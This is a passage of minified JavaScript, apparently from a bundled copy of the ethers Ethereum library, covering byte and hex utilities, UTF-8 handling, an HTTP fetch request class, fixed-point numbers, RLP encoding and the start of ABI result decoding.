mOe({...t,sdkVersion:xe.generateSdkVersion(t.adapters??[],"react",gOe)})),bO}const yBe="6.16.0";function bBe(t,e,n){const r=e.split("|").map(s=>s.trim());for(let s=0;s<r.length;s++)switch(e){case"any":return;case"bigint":case"boolean":case"number":case"string":if(typeof t===e)return}const i=new Error(`invalid value for type ${e}`);throw i.code="INVALID_ARGUMENT",i.argument=`value.${n}`,i.value=t,i}async function ho(t){const e=Object.keys(t);return(await Promise.all(e.map(r=>Promise.resolve(t[r])))).reduce((r,i,s)=>(r[e[s]]=i,r),{})}function Lt(t,e,n){for(let r in e){let i=e[r];const s=n?n[r]:null;s&&bBe(i,s,r),Object.defineProperty(t,r,{enumerable:!0,value:i,writable:!1})}}function Kb(t,e){if(t==null)return"null";if(e==null&&(e=new Set),typeof t=="object"){if(e.has(t))return"[Circular]";e.add(t)}if(Array.isArray(t))return"[ "+t.map(n=>Kb(n,e)).join(", ")+" ]";if(t instanceof Uint8Array){const n="0123456789abcdef";let r="0x";for(let i=0;i<t.length;i++)r+=n[t[i]>>4],r+=n[t[i]&15];return r}if(typeof t=="object"&&typeof t.toJSON=="function")return Kb(t.toJSON(),e);switch(typeof t){case"boolean":case"number":case"symbol":return t.toString();case"bigint":return BigInt(t).toString();case"string":return JSON.stringify(t);case"object":{const n=Object.keys(t);return n.sort(),"{ "+n.map(r=>`${Kb(r,e)}: ${Kb(t[r],e)}`).join(", ")+" }"}}return"[ COULD NOT SERIALIZE ]"}function Ss(t,e){return t&&t.code===e}function fj(t){return Ss(t,"CALL_EXCEPTION")}function Mr(t,e,n){let r=t;{const s=[];if(n){if("message"in n||"code"in n||"name"in n)throw new Error(`value will overwrite populated values: ${Kb(n)}`);for(const o in n){if(o==="shortMessage")continue;const a=n[o];s.push(o+"="+Kb(a))}}s.push(`code=${e}`),s.push(`version=${yBe}`),s.length&&(t+=" ("+s.join(", ")+")")}let i;switch(e){case"INVALID_ARGUMENT":i=new TypeError(t);break;case"NUMERIC_FAULT":case"BUFFER_OVERRUN":i=new RangeError(t);break;default:i=new Error(t)}return Lt(i,{code:e}),n&&Object.assign(i,n),i.shortMessage==null&&Lt(i,{shortMessage:r}),i}function qe(t,e,n,r){if(!t)throw Mr(e,n,r)}function pe(t,e,n,r){qe(t,e,"INVALID_ARGUMENT",{argument:n,value:r})}function ace(t,e,n){n==null&&(n=""),n&&(n=": "+n),qe(t>=e,"missing argument"+n,"MISSING_ARGUMENT",{count:t,expectedCount:e}),qe(t<=e,"too many arguments"+n,"UNEXPECTED_ARGUMENT",{count:t,expectedCount:e})}["NFD","NFC","NFKD","NFKC"].reduce((t,e)=>{try{if("test".normalize(e)!=="test")throw new Error("bad");if(e==="NFD"&&"".normalize("NFD")!=="e")throw new Error("broken");t.push(e)}catch{}return t},[]);function SA(t,e,n){if(n==null&&(n=""),t!==e){let r=n,i="new";n&&(r+=".",i+=" "+n),qe(!1,`private constructor; use ${r}from* methods`,"UNSUPPORTED_OPERATION",{operation:i})}}function cce(t,e,n){if(t instanceof Uint8Array)return n?new Uint8Array(t):t;if(typeof t=="string"&&t.length%2===0&&t.match(/^0x[0-9a-f]*$/i)){const r=new Uint8Array((t.length-2)/2);let i=2;for(let s=0;s<r.length;s++)r[s]=parseInt(t.substring(i,i+2),16),i+=2;return r}pe(!1,"invalid BytesLike value",e||"value",t)}function an(t,e){return cce(t,e,!1)}function po(t,e){return cce(t,e,!0)}function gr(t,e){return!(typeof t!="string"||!t.match(/^0x[0-9A-Fa-f]*$/)||typeof e=="number"&&t.length!==2+2*e||e===!0&&t.length%2!==0)}function hj(t){return gr(t,!0)||t instanceof Uint8Array}const KW="0123456789abcdef";function rt(t){const e=an(t);let n="0x";for(let r=0;r<e.length;r++){const i=e[r];n+=KW[(i&240)>>4]+KW[i&15]}return n}function Lr(t){return"0x"+t.map(e=>rt(e).substring(2)).join("")}function o1(t){return gr(t,!0)?(t.length-2)/2:an(t).length}function si(t,e,n){const r=an(t);return n!=null&&n>r.length&&qe(!1,"cannot slice beyond data bounds","BUFFER_OVERRUN",{buffer:r,length:r.length,offset:n}),rt(r.slice(e??0,n??r.length))}function uce(t,e,n){const r=an(t);qe(e>=r.length,"padding exceeds data length","BUFFER_OVERRUN",{buffer:new Uint8Array(r),length:e,offset:e+1});const i=new Uint8Array(e);return i.fill(0),n?i.set(r,e-r.length):i.set(r,0),rt(i)}function Ff(t,e){return uce(t,e,!0)}function wBe(t,e){return uce(t,e,!1)}const TA=BigInt(0),Nu=BigInt(1),Zb=9007199254740991;function uI(t,e){const n=v8(t,"value"),r=BigInt(Qt(e,"width"));if(qe(n>>r===TA,"overflow","NUMERIC_FAULT",{operation:"fromTwos",fault:"overflow",value:t}),n>>r-Nu){const i=(Nu<<r)-Nu;return-((~n&i)+Nu)}return n}function lce(t,e){let n=wt(t,"value");const r=BigInt(Qt(e,"width")),i=Nu<<r-Nu;if(n<TA){n=-n,qe(n<=i,"too low","NUMERIC_FAULT",{operation:"toTwos",fault:"overflow",value:t});const s=(Nu<<r)-Nu;return(~n&s)+Nu}else qe(n<i,"too high","NUMERIC_FAULT",{operation:"toTwos",fault:"overflow",value:t});return n}function Hm(t,e){const n=v8(t,"value"),r=BigInt(Qt(e,"bits"));return n&(Nu<<r)-Nu}function wt(t,e){switch(typeof t){case"bigint":return t;case"number":return pe(Number.isInteger(t),"underflow",e||"value",t),pe(t>=-Zb&&t<=Zb,"overflow",e||"value",t),BigInt(t);case"string":try{if(t==="")throw new Error("empty string");return t[0]==="-"&&t[1]!=="-"?-BigInt(t.substring(1)):BigInt(t)}catch(n){pe(!1,`invalid BigNumberish string: ${n.message}`,e||"value",t)}}pe(!1,"invalid BigNumberish value",e||"value",t)}function v8(t,e){const n=wt(t,e);return qe(n>=TA,"unsigned value cannot be negative","NUMERIC_FAULT",{fault:"overflow",operation:"getUint",value:t}),n}const ZW="0123456789abcdef";function E8(t){if(t instanceof Uint8Array){let e="0x0";for(const n of t)e+=ZW[n>>4],e+=ZW[n&15];return BigInt(e)}return wt(t)}function Qt(t,e){switch(typeof t){case"bigint":return pe(t>=-Zb&&t<=Zb,"overflow",e||"value",t),Number(t);case"number":return pe(Number.isInteger(t),"underflow",e||"value",t),pe(t>=-Zb&&t<=Zb,"overflow",e||"value",t),t;case"string":try{if(t==="")throw new Error("empty string");return Qt(BigInt(t),e)}catch(n){pe(!1,`invalid numeric string: ${n.message}`,e||"value",t)}}pe(!1,"invalid numeric value",e||"value",t)}function vBe(t){return Qt(E8(t))}function Lp(t,e){const n=v8(t,"value");let r=n.toString(16);if(e==null)r.length%2&&(r="0"+r);else{const i=Qt(e,"width");if(i===0&&n===TA)return"0x";for(qe(i*2>=r.length,`value exceeds width (${i} bytes)`,"NUMERIC_FAULT",{operation:"toBeHex",fault:"overflow",value:t});r.length<i*2;)r="0"+r}return"0x"+r}function Di(t,e){const n=v8(t,"value");if(n===TA)return new Uint8Array(0);let r=n.toString(16);r.length%2&&(r="0"+r);const i=new Uint8Array(r.length/2);for(let s=0;s<i.length;s++){const o=s*2;i[s]=parseInt(r.substring(o,o+2),16)}return i}function Ru(t){let e=rt(hj(t)?t:Di(t)).substring(2);for(;e.startsWith("0");)e=e.substring(1);return e===""&&(e="0"),"0x"+e}const YW="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";BigInt(0);const QW=BigInt(58);function EBe(t){const e=an(t);let n=E8(e),r="";for(;n;)r=YW[Number(n%QW)]+r,n/=QW;for(let i=0;i<e.length&&!e[i];i++)r=YW[0]+r;return r}function _Be(t){t=atob(t);const e=new Uint8Array(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return an(e)}function ABe(t){const e=an(t);let n="";for(let r=0;r<e.length;r++)n+=String.fromCharCode(e[r]);return btoa(n)}class dce{filter;emitter;#e;constructor(e,n,r){this.#e=n,Lt(this,{emitter:e,filter:r})}async removeListener(){this.#e!=null&&await this.emitter.off(this.filter,this.#e)}}function CBe(t,e,n,r,i){pe(!1,`invalid codepoint at offset ${e}; ${t}`,"bytes",n)}function fce(t,e,n,r,i){if(t==="BAD_PREFIX"||t==="UNEXPECTED_CONTINUE"){let s=0;for(let o=e+1;o<n.length&&n[o]>>6===2;o++)s++;return s}return t==="OVERRUN"?n.length-e-1:0}function SBe(t,e,n,r,i){return t==="OVERLONG"?(pe(typeof i=="number","invalid bad code point for replacement","badCodepoint",i),r.push(i),0):(r.push(65533),fce(t,e,n))}const TBe=Object.freeze({error:CBe,ignore:fce,replace:SBe});function xBe(t,e){e==null&&(e=TBe.error);const n=an(t,"bytes"),r=[];let i=0;for(;i<n.length;){const s=n[i++];if(s>>7===0){r.push(s);continue}let o=null,a=null;if((s&224)===192)o=1,a=127;else if((s&240)===224)o=2,a=2047;else if((s&248)===240)o=3,a=65535;else{(s&192)===128?i+=e("UNEXPECTED_CONTINUE",i-1,n,r):i+=e("BAD_PREFIX",i-1,n,r);continue}if(i-1+o>=n.length){i+=e("OVERRUN",i-1,n,r);continue}let c=s&(1<<8-o-1)-1;for(let l=0;l<o;l++){let f=n[i];if((f&192)!=128){i+=e("MISSING_CONTINUE",i,n,r),c=null;break}c=c<<6|f&63,i++}if(c!==null){if(c>1114111){i+=e("OUT_OF_RANGE",i-1-o,n,r,c);continue}if(c>=55296&&c<=57343){i+=e("UTF16_SURROGATE",i-1-o,n,r,c);continue}if(c<=a){i+=e("OVERLONG",i-1-o,n,r,c);continue}r.push(c)}}return r}function Hl(t,e){pe(typeof t=="string","invalid string value","str",t);let n=[];for(let r=0;r<t.length;r++){const i=t.charCodeAt(r);if(i<128)n.push(i);else if(i<2048)n.push(i>>6|192),n.push(i&63|128);else if((i&64512)==55296){r++;const s=t.charCodeAt(r);pe(r<t.length&&(s&64512)===56320,"invalid surrogate pair","str",t);const o=65536+((i&1023)<<10)+(s&1023);n.push(o>>18|240),n.push(o>>12&63|128),n.push(o>>6&63|128),n.push(o&63|128)}else n.push(i>>12|224),n.push(i>>6&63|128),n.push(i&63|128)}return new Uint8Array(n)}function IBe(t){return t.map(e=>e<=65535?String.fromCharCode(e):(e-=65536,String.fromCharCode((e>>10&1023)+55296,(e&1023)+56320))).join("")}function lI(t,e){return IBe(xBe(t,e))}function hce(t){async function e(n,r){qe(r==null||!r.cancelled,"request cancelled before sending","CANCELLED");const i=n.url.split(":")[0].toLowerCase();qe(i==="http"||i==="https",`unsupported protocol ${i}`,"UNSUPPORTED_OPERATION",{info:{protocol:i},operation:"request"}),qe(i==="https"||!n.credentials||n.allowInsecureAuthentication,"insecure authorized connections unsupported","UNSUPPORTED_OPERATION",{operation:"request"});let s=null;const o=new AbortController,a=setTimeout(()=>{s=Mr("request timeout","TIMEOUT"),o.abort()},n.timeout);r&&r.addListener(()=>{s=Mr("request cancelled","CANCELLED"),o.abort()});const c=Object.assign({},t,{method:n.method,headers:new Headers(Array.from(n)),body:n.body||void 0,signal:o.signal});let l;try{l=await fetch(n.url,c)}catch(b){throw clearTimeout(a),s||b}clearTimeout(a);const f={};l.headers.forEach((b,w)=>{f[w.toLowerCase()]=b});const h=await l.arrayBuffer(),m=h==null?null:new Uint8Array(h);return{statusCode:l.status,statusMessage:l.statusText,headers:f,body:m}}return e}const RBe=12,PBe=250;let JW=hce();const NBe=new RegExp("^data:([^;:]*)?(;base64)?,(.*)$","i"),OBe=new RegExp("^ipfs://(ipfs/)?(.*)$","i");let wO=!1;async function pce(t,e){try{const n=t.match(NBe);if(!n)throw new Error("invalid data");return new wp(200,"OK",{"content-type":n[1]||"text/plain"},n[2]?_Be(n[3]):DBe(n[3]))}catch{return new wp(599,"BAD REQUEST (invalid data: URI)",{},null,new nd(t))}}function mce(t){async function e(n,r){try{const i=n.match(OBe);if(!i)throw new Error("invalid link");return new nd(`${t}${i[2]}`)}catch{return new wp(599,"BAD REQUEST (invalid IPFS URI)",{},null,new nd(n))}}return e}const s6={data:pce,ipfs:mce("https://gateway.ipfs.io/ipfs/")},gce=new WeakMap;class kBe{#e;#t;constructor(e){this.#e=[],this.#t=!1,gce.set(e,()=>{if(!this.#t){this.#t=!0;for(const n of this.#e)setTimeout(()=>{n()},0);this.#e=[]}})}addListener(e){qe(!this.#t,"singal already cancelled","UNSUPPORTED_OPERATION",{operation:"fetchCancelSignal.addCancelListener"}),this.#e.push(e)}get cancelled(){return this.#t}checkSignal(){qe(!this.cancelled,"cancelled","CANCELLED",{})}}function o6(t){if(t==null)throw new Error("missing signal; should not happen");return t.checkSignal(),t}class nd{#e;#t;#n;#r;#i;#o;#s;#a;#d;#u;#p;#m;#c;#l;#f;get url(){return this.#o}set url(e){this.#o=String(e)}get body(){return this.#s==null?null:new Uint8Array(this.#s)}set body(e){if(e==null)this.#s=void 0,this.#a=void 0;else if(typeof e=="string")this.#s=Hl(e),this.#a="text/plain";else if(e instanceof Uint8Array)this.#s=e,this.#a="application/octet-stream";else if(typeof e=="object")this.#s=Hl(JSON.stringify(e)),this.#a="application/json";else throw new Error("invalid body")}hasBody(){return this.#s!=null}get method(){return this.#r?this.#r:this.hasBody()?"POST":"GET"}set method(e){e==null&&(e=""),this.#r=String(e).toUpperCase()}get headers(){const e=Object.assign({},this.#n);return this.#d&&(e.authorization=`Basic ${ABe(Hl(this.#d))}`),this.allowGzip&&(e["accept-encoding"]="gzip"),e["content-type"]==null&&this.#a&&(e["content-type"]=this.#a),this.body&&(e["content-length"]=String(this.body.length)),e}getHeader(e){return this.headers[e.toLowerCase()]}setHeader(e,n){this.#n[String(e).toLowerCase()]=String(n)}clearHeaders(){this.#n={}}[Symbol.iterator](){const e=this.headers,n=Object.keys(e);let r=0;return{next:()=>{if(r<n.length){const i=n[r++];return{value:[i,e[i]],done:!1}}return{value:void 0,done:!0}}}}get credentials(){return this.#d||null}setCredentials(e,n){pe(!e.match(/:/),"invalid basic authentication username","username","[REDACTED]"),this.#d=`${e}:${n}`}get allowGzip(){return this.#t}set allowGzip(e){this.#t=!!e}get allowInsecureAuthentication(){return!!this.#e}set allowInsecureAuthentication(e){this.#e=!!e}get timeout(){return this.#i}set timeout(e){pe(e>=0,"timeout must be non-zero","timeout",e),this.#i=e}get preflightFunc(){return this.#u||null}set preflightFunc(e){this.#u=e}get processFunc(){return this.#p||null}set processFunc(e){this.#p=e}get retryFunc(){return this.#m||null}set retryFunc(e){this.#m=e}get getUrlFunc(){return this.#f||JW}set getUrlFunc(e){this.#f=e}constructor(e){this.#o=String(e),this.#e=!1,this.#t=!0,this.#n={},this.#r="",this.#i=3e5,this.#l={slotInterval:PBe,maxAttempts:RBe},this.#f=null}toString(){return`<FetchRequest method=${JSON.stringify(this.method)} url=${JSON.stringify(this.url)} headers=${JSON.stringify(this.headers)} body=${this.#s?rt(this.#s):"null"}>`}setThrottleParams(e){e.slotInterval!=null&&(this.#l.slotInterval=e.slotInterval),e.maxAttempts!=null&&(this.#l.maxAttempts=e.maxAttempts)}async#h(e,n,r,i,s){if(e>=this.#l.maxAttempts)return s.makeServerError("exceeded maximum retry limit");qe(XW()<=n,"timeout","TIMEOUT",{operation:"request.send",reason:"timeout",request:i}),r>0&&await BBe(r);let o=this.clone();const a=(o.url.split(":")[0]||"").toLowerCase();if(a in s6){const f=await s6[a](o.url,o6(i.#c));if(f instanceof wp){let h=f;if(this.processFunc){o6(i.#c);try{h=await this.processFunc(o,h)}catch(m){(m.throttle==null||typeof m.stall!="number")&&h.makeServerError("error in post-processing function",m).assertOk()}}return h}o=f}this.preflightFunc&&(o=await this.preflightFunc(o));const c=await this.getUrlFunc(o,o6(i.#c));let l=new wp(c.statusCode,c.statusMessage,c.headers,c.body,i);if(l.statusCode===301||l.statusCode===302){try{const f=l.headers.location||"";return o.redirect(f).#h(e+1,n,0,i,l)}catch{}return l}else if(l.statusCode===429&&(this.retryFunc==null||await this.retryFunc(o,l,e))){const f=l.headers["retry-after"];let h=this.#l.slotInterval*Math.trunc(Math.random()*Math.pow(2,e));return typeof f=="string"&&f.match(/^[1-9][0-9]*$/)&&(h=parseInt(f)),o.clone().#h(e+1,n,h,i,l)}if(this.processFunc){o6(i.#c);try{l=await this.processFunc(o,l)}catch(f){(f.throttle==null||typeof f.stall!="number")&&l.makeServerError("error in post-processing function",f).assertOk();let h=this.#l.slotInterval*Math.trunc(Math.random()*Math.pow(2,e));return f.stall>=0&&(h=f.stall),o.clone().#h(e+1,n,h,i,l)}}return l}send(){return qe(this.#c==null,"request already sent","UNSUPPORTED_OPERATION",{operation:"fetchRequest.send"}),this.#c=new kBe(this),this.#h(0,XW()+this.timeout,0,this,new wp(0,"",{},null,this))}cancel(){qe(this.#c!=null,"request has not been sent","UNSUPPORTED_OPERATION",{operation:"fetchRequest.cancel"});const e=gce.get(this);if(!e)throw new Error("missing signal; should not happen");e()}redirect(e){const n=this.url.split(":")[0].toLowerCase(),r=e.split(":")[0].toLowerCase();qe(this.method==="GET"&&(n!=="https"||r!=="http")&&e.match(/^https?:/),"unsupported redirect","UNSUPPORTED_OPERATION",{operation:`redirect(${this.method} ${JSON.stringify(this.url)} => ${JSON.stringify(e)})`});const i=new nd(e);return i.method="GET",i.allowGzip=this.allowGzip,i.timeout=this.timeout,i.#n=Object.assign({},this.#n),this.#s&&(i.#s=new Uint8Array(this.#s)),i.#a=this.#a,i}clone(){const e=new nd(this.url);return e.#r=this.#r,this.#s&&(e.#s=this.#s),e.#a=this.#a,e.#n=Object.assign({},this.#n),e.#d=this.#d,this.allowGzip&&(e.allowGzip=!0),e.timeout=this.timeout,this.allowInsecureAuthentication&&(e.allowInsecureAuthentication=!0),e.#u=this.#u,e.#p=this.#p,e.#m=this.#m,e.#l=Object.assign({},this.#l),e.#f=this.#f,e}static lockConfig(){wO=!0}static getGateway(e){return s6[e.toLowerCase()]||null}static registerGateway(e,n){if(e=e.toLowerCase(),e==="http"||e==="https")throw new Error(`cannot intercept ${e}; use registerGetUrl`);if(wO)throw new Error("gateways locked");s6[e]=n}static registerGetUrl(e){if(wO)throw new Error("gateways locked");JW=e}static createGetUrlFunc(e){return hce(e)}static createDataGateway(){return pce}static createIpfsGatewayFunc(e){return mce(e)}}class wp{#e;#t;#n;#r;#i;#o;toString(){return`<FetchResponse status=${this.statusCode} body=${this.#r?rt(this.#r):"null"}>`}get statusCode(){return this.#e}get statusMessage(){return this.#t}get headers(){return Object.assign({},this.#n)}get body(){return this.#r==null?null:new Uint8Array(this.#r)}get bodyText(){try{return this.#r==null?"":lI(this.#r)}catch{qe(!1,"response body is not valid UTF-8 data","UNSUPPORTED_OPERATION",{operation:"bodyText",info:{response:this}})}}get bodyJson(){try{return JSON.parse(this.bodyText)}catch{qe(!1,"response body is not valid JSON","UNSUPPORTED_OPERATION",{operation:"bodyJson",info:{response:this}})}}[Symbol.iterator](){const e=this.headers,n=Object.keys(e);let r=0;return{next:()=>{if(r<n.length){const i=n[r++];return{value:[i,e[i]],done:!1}}return{value:void 0,done:!0}}}}constructor(e,n,r,i,s){this.#e=e,this.#t=n,this.#n=Object.keys(r).reduce((o,a)=>(o[a.toLowerCase()]=String(r[a]),o),{}),this.#r=i==null?null:new Uint8Array(i),this.#i=s||null,this.#o={message:""}}makeServerError(e,n){let r;e?r=`CLIENT ESCALATED SERVER ERROR (${this.statusCode} ${this.statusMessage}; ${e})`:(e=`${this.statusCode} ${this.statusMessage}`,r=`CLIENT ESCALATED SERVER ERROR (${e})`);const i=new wp(599,r,this.headers,this.body,this.#i||void 0);return i.#o={message:e,error:n},i}throwThrottleError(e,n){n==null?n=-1:pe(Number.isInteger(n)&&n>=0,"invalid stall timeout","stall",n);const r=new Error(e||"throttling requests");throw Lt(r,{stall:n,throttle:!0}),r}getHeader(e){return this.headers[e.toLowerCase()]}hasBody(){return this.#r!=null}get request(){return this.#i}ok(){return this.#o.message===""&&this.statusCode>=200&&this.statusCode<300}assertOk(){if(this.ok())return;let{message:e,error:n}=this.#o;e===""&&(e=`server response ${this.statusCode} ${this.statusMessage}`);let r=null;this.request&&(r=this.request.url);let i=null;try{this.#r&&(i=lI(this.#r))}catch{}qe(!1,e,"SERVER_ERROR",{request:this.request||"unknown request",response:this,error:n,info:{requestUrl:r,responseBody:i,responseStatus:`${this.statusCode} ${this.statusMessage}`}})}}function XW(){return new Date().getTime()}function DBe(t){return Hl(t.replace(/%([0-9a-f][0-9a-f])/gi,(e,n)=>String.fromCharCode(parseInt(n,16))))}function BBe(t){return new Promise(e=>setTimeout(e,t))}const jBe=BigInt(-1),Cu=BigInt(0),Yb=BigInt(1),MBe=BigInt(5),db={};let a1="0000";for(;a1.length<80;)a1+=a1;function X0(t){let e=a1;for(;e.length<t;)e+=e;return BigInt("1"+e.substring(0,t))}function Mv(t,e,n){const r=BigInt(e.width);if(e.signed){const i=Yb<<r-Yb;qe(n==null||t>=-i&&t<i,"overflow","NUMERIC_FAULT",{operation:n,fault:"overflow",value:t}),t>Cu?t=uI(Hm(t,r),r):t=-uI(Hm(-t,r),r)}else{const i=Yb<<r;qe(n==null||t>=0&&t<i,"overflow","NUMERIC_FAULT",{operation:n,fault:"overflow",value:t}),t=(t%i+i)%i&i-Yb}return t}function vO(t){typeof t=="number"&&(t=`fixed128x${t}`);let e=!0,n=128,r=18;if(typeof t=="string"){if(t!=="fixed")if(t==="ufixed")e=!1;else{const s=t.match(/^(u?)fixed([0-9]+)x([0-9]+)$/);pe(s,"invalid fixed format","format",t),e=s[1]!=="u",n=parseInt(s[2]),r=parseInt(s[3])}}else if(t){const s=t,o=(a,c,l)=>s[a]==null?l:(pe(typeof s[a]===c,"invalid fixed format ("+a+" not "+c+")","format."+a,s[a]),s[a]);e=o("signed","boolean",e),n=o("width","number",n),r=o("decimals","number",r)}pe(n%8===0,"invalid FixedNumber width (not byte aligned)","format.width",n),pe(r<=80,"invalid FixedNumber decimals (too large)","format.decimals",r);const i=(e?"":"u")+"fixed"+String(n)+"x"+String(r);return{signed:e,width:n,decimals:r,name:i}}function UBe(t,e){let n="";t<Cu&&(n="-",t*=jBe);let r=t.toString();if(e===0)return n+r;for(;r.length<=e;)r=a1+r;const i=r.length-e;for(r=r.substring(0,i)+"."+r.substring(i);r[0]==="0"&&r[1]!==".";)r=r.substring(1);for(;r[r.length-1]==="0"&&r[r.length-2]!==".";)r=r.substring(0,r.length-1);return n+r}class hf{format;#e;#t;#n;_value;constructor(e,n,r){SA(e,db,"FixedNumber"),this.#t=n,this.#e=r;const i=UBe(n,r.decimals);Lt(this,{format:r.name,_value:i}),this.#n=X0(r.decimals)}get signed(){return this.#e.signed}get width(){return this.#e.width}get decimals(){return this.#e.decimals}get value(){return this.#t}#r(e){pe(this.format===e.format,"incompatible format; use fixedNumber.toFormat","other",e)}#i(e,n){return e=Mv(e,this.#e,n),new hf(db,e,this.#e)}#o(e,n){return this.#r(e),this.#i(this.#t+e.#t,n)}addUnsafe(e){return this.#o(e)}add(e){return this.#o(e,"add")}#s(e,n){return this.#r(e),this.#i(this.#t-e.#t,n)}subUnsafe(e){return this.#s(e)}sub(e){return this.#s(e,"sub")}#a(e,n){return this.#r(e),this.#i(this.#t*e.#t/this.#n,n)}mulUnsafe(e){return this.#a(e)}mul(e){return this.#a(e,"mul")}mulSignal(e){this.#r(e);const n=this.#t*e.#t;return qe(n%this.#n===Cu,"precision lost during signalling mul","NUMERIC_FAULT",{operation:"mulSignal",fault:"underflow",value:this}),this.#i(n/this.#n,"mulSignal")}#d(e,n){return qe(e.#t!==Cu,"division by zero","NUMERIC_FAULT",{operation:"div",fault:"divide-by-zero",value:this}),this.#r(e),this.#i(this.#t*this.#n/e.#t,n)}divUnsafe(e){return this.#d(e)}div(e){return this.#d(e,"div")}divSignal(e){qe(e.#t!==Cu,"division by zero","NUMERIC_FAULT",{operation:"div",fault:"divide-by-zero",value:this}),this.#r(e);const n=this.#t*this.#n;return qe(n%e.#t===Cu,"precision lost during signalling div","NUMERIC_FAULT",{operation:"divSignal",fault:"underflow",value:this}),this.#i(n/e.#t,"divSignal")}cmp(e){let n=this.value,r=e.value;const i=this.decimals-e.decimals;return i>0?r*=X0(i):i<0&&(n*=X0(-i)),n<r?-1:n>r?1:0}eq(e){return this.cmp(e)===0}lt(e){return this.cmp(e)<0}lte(e){return this.cmp(e)<=0}gt(e){return this.cmp(e)>0}gte(e){return this.cmp(e)>=0}floor(){let e=this.#t;return this.#t<Cu&&(e-=this.#n-Yb),e=this.#t/this.#n*this.#n,this.#i(e,"floor")}ceiling(){let e=this.#t;return this.#t>Cu&&(e+=this.#n-Yb),e=this.#t/this.#n*this.#n,this.#i(e,"ceiling")}round(e){if(e==null&&(e=0),e>=this.decimals)return this;const n=this.decimals-e,r=MBe*X0(n-1);let i=this.value+r;const s=X0(n);return i=i/s*s,Mv(i,this.#e,"round"),new hf(db,i,this.#e)}isZero(){return this.#t===Cu}isNegative(){return this.#t<Cu}toString(){return this._value}toUnsafeFloat(){return parseFloat(this.toString())}toFormat(e){return hf.fromString(this.toString(),e)}static fromValue(e,n,r){const i=n==null?0:Qt(n),s=vO(r);let o=wt(e,"value");const a=i-s.decimals;if(a>0){const c=X0(a);qe(o%c===Cu,"value loses precision for format","NUMERIC_FAULT",{operation:"fromValue",fault:"underflow",value:e}),o/=c}else a<0&&(o*=X0(-a));return Mv(o,s,"fromValue"),new hf(db,o,s)}static fromString(e,n){const r=e.match(/^(-?)([0-9]*)\.?([0-9]*)$/);pe(r&&r[2].length+r[3].length>0,"invalid FixedNumber string value","value",e);const i=vO(n);let s=r[2]||"0",o=r[3]||"";for(;o.length<i.decimals;)o+=a1;qe(o.substring(i.decimals).match(/^0*$/),"too many decimals for format","NUMERIC_FAULT",{operation:"fromString",fault:"underflow",value:e}),o=o.substring(0,i.decimals);const a=BigInt(r[1]+s+o);return Mv(a,i,"fromString"),new hf(db,a,i)}static fromBytes(e,n){let r=E8(an(e,"value"));const i=vO(n);return i.signed&&(r=uI(r,i.width)),Mv(r,i,"fromBytes"),new hf(db,r,i)}}function LBe(t){let e=t.toString(16);for(;e.length<2;)e="0"+e;return"0x"+e}function eG(t,e,n){let r=0;for(let i=0;i<n;i++)r=r*256+t[e+i];return r}function tG(t,e,n,r){const i=[];for(;n<e+1+r;){const s=yce(t,n);i.push(s.result),n+=s.consumed,qe(n<=e+1+r,"child data too short","BUFFER_OVERRUN",{buffer:t,length:r,offset:e})}return{consumed:1+r,result:i}}function yce(t,e){qe(t.length!==0,"data too short","BUFFER_OVERRUN",{buffer:t,length:0,offset:1});const n=r=>{qe(r<=t.length,"data short segment too short","BUFFER_OVERRUN",{buffer:t,length:t.length,offset:r})};if(t[e]>=248){const r=t[e]-247;n(e+1+r);const i=eG(t,e+1,r);return n(e+1+r+i),tG(t,e,e+1+r,r+i)}else if(t[e]>=192){const r=t[e]-192;return n(e+1+r),tG(t,e,e+1,r)}else if(t[e]>=184){const r=t[e]-183;n(e+1+r);const i=eG(t,e+1,r);n(e+1+r+i);const s=rt(t.slice(e+1+r,e+1+r+i));return{consumed:1+r+i,result:s}}else if(t[e]>=128){const r=t[e]-128;n(e+1+r);const i=rt(t.slice(e+1,e+1+r));return{consumed:1+r,result:i}}return{consumed:1,result:LBe(t[e])}}function xA(t){const e=an(t,"data"),n=yce(e,0);return pe(n.consumed===e.length,"unexpected junk after rlp payload","data",t),n.result}function nG(t){const e=[];for(;t;)e.unshift(t&255),t>>=8;return e}function bce(t){if(Array.isArray(t)){let r=[];if(t.forEach(function(s){r=r.concat(bce(s))}),r.length<=55)return r.unshift(192+r.length),r;const i=nG(r.length);return i.unshift(247+i.length),i.concat(r)}const e=Array.prototype.slice.call(an(t,"object"));if(e.length===1&&e[0]<=127)return e;if(e.length<=55)return e.unshift(128+e.length),e;const n=nG(e.length);return n.unshift(183+n.length),n.concat(e)}const rG="0123456789abcdef";function Sf(t){let e="0x";for(const n of bce(t))e+=rG[n>>4],e+=rG[n&15];return e}const wce=["wei","kwei","mwei","gwei","szabo","finney","ether"];function pj(t,e){let n=18;if(typeof e=="string"){const r=wce.indexOf(e);pe(r>=0,"invalid unit","unit",e),n=3*r}else e!=null&&(n=Qt(e,"unit"));return hf.fromValue(t,n,{decimals:n,width:512}).toString()}function FBe(t,e){pe(typeof t=="string","value must be a string","value",t);let n=18;if(typeof e=="string"){const r=wce.indexOf(e);pe(r>=0,"invalid unit","unit",e),n=3*r}else e!=null&&(n=Qt(e,"unit"));return hf.fromString(t,{decimals:n,width:512}).value}function iD(t){return pj(t,18)}const mo=32,sD=new Uint8Array(mo),$Be=["then"],a6={},vce=new WeakMap;function Nm(t){return vce.get(t)}function iG(t,e){vce.set(t,e)}function Uv(t,e){const n=new Error(`deferred error during ABI decoding triggered accessing ${t}`);throw n.error=e,n}function oD(t,e,n){return t.indexOf(null)>=0?e.map((r,i)=>r instanceof wf?oD(Nm(r),r,n):r):t.reduce((r,i,s)=>{let o=e.getValue(i);return i in r||(n&&o instanceof wf&&(o=oD(Nm(o),o,n)),r[i]=o),r},{})}class wf extends Array{#e;constructor(...e){const n=e[0];let r=e[1],i=(e[2]||[]).slice(),s=!0;n!==a6&&(r=e,i=[],s=!1),super(r.length),r.forEach((c,l)=>{this[l]=c});const o=i.reduce((c,l)=>(typeof l=="string"&&c.set(l,(c.get(l)||0)+1),c),new Map);if(iG(this,Object.freeze(r.map((c,l)=>{const f=i[l];return f!=null&&o.get(f)===1?f:null}))),this.#e=[],this.#e==null&&this.#e,!s)return;Object.freeze(this);const a=new Proxy(this,{get:(c,l,f)=>{if(typeof l=="string"){if(l.match(/^[0-9]+$/)){const m=Qt(l,"%index");if(m<0||m>=this.length)throw new RangeError("out of result range");const b=c[m];return b instanceof Error&&Uv(`index ${m}`,b),b}if($Be.indexOf(l)>=0)return Reflect.get(c,l,f);const 